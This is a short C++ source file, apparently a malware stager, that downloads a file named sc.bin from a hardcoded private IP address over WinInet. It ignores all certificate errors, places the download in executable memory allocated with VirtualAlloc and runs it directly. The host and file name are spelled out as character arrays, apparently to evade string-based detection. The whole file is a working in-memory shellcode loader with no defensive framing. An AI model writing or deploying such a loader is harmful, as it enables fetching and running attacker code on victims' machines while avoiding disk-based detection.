// download_file_in_memory_example.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>

#pragma comment(lib, "Wininet")


int main(int argc, CHAR* argv[])
{

	char hostname[] = { '1', '9', '2', '.', '1', '6', '8', '.', '4', '3', '.', '1', '3', '0', 0 };
	//char sc[] = { 's', 'c', '.', 't', 'x', 't', 0 };
	char sc[] = { 's', 'c', '.', 'b', 'i', 'n', 0 };

	HINTERNET internet_open;
	internet_open = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (internet_open == NULL) {
		printf("InternetOpen: %d\n", GetLastError());
		return 1;
	}

	HINTERNET internet_connect;
	internet_connect = InternetConnectA(internet_open, hostname, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, INTERNET_FLAG_RELOAD, 0);
	if (internet_connect == NULL) {
		printf("InternetConnectA: %d\n", GetLastError());
		return 1;
	}

	HINTERNET http_request;
	http_request = HttpOpenRequestA(internet_connect, NULL, sc, "HTTP/1.1", NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT, 0);

	DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;

	if (InternetSetOptionA(http_request, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)) == FALSE) {
		printf("InternetSetOptionA: %d\n", GetLastError());
		return 1;
	}

	if (HttpSendRequestA(http_request, 0, 0, 0, 0) == FALSE) {
		printf("HttpSendRequestA: %d\n", GetLastError());
		return 1;
	}

	LPVOID alloc;
	DWORD dwLength = 00400000;
	DWORD bytesRead;
	alloc = VirtualAlloc(NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (InternetReadFile(http_request, alloc, 0x8192, &bytesRead) == FALSE) {
		printf("InternetReadFile: %d\n", GetLastError());
		return 1;
	}
	((void(*)(void))alloc)();

	return 0;
}